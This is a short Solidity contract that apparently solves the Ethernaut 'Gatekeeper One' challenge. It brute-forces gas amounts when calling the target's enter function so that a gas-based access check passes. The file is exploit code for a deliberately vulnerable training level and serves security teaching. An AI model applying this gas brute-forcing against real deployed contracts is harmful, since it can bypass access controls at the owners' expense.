// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperOneAttack {
  function attack(address _gatekeeperAddress, bytes8 _gateKey) public returns (bool) {
    // https://github.com/OpenZeppelin/ethernaut/blob/33e4b5b2c5133aa78b43ca96944ec24be16ab344/contracts/contracts/attacks/GatekeeperOneAttack.sol

    // NOTE: the proper gas offset to use will vary depending on the compiler
    // version and optimization settings used to deploy the factory contract.
    // To mitigate, brute-force a range of possible values of gas to forward.
    // Using call (vs. an abstract interface) prevents reverts from propagating.
    bytes memory encodedParams = abi.encodeWithSignature(("enter(bytes8)"), _gateKey);

    // gas offset usually comes in around 210, give a buffer of 60 on each side
    for (uint256 i = 0; i < 120; i++) {
      (bool result, ) = address(_gatekeeperAddress).call{gas: i + 150 + 8191 * 3}(encodedParams);
      if(result)
        {
        break;
      }
    }
  }
}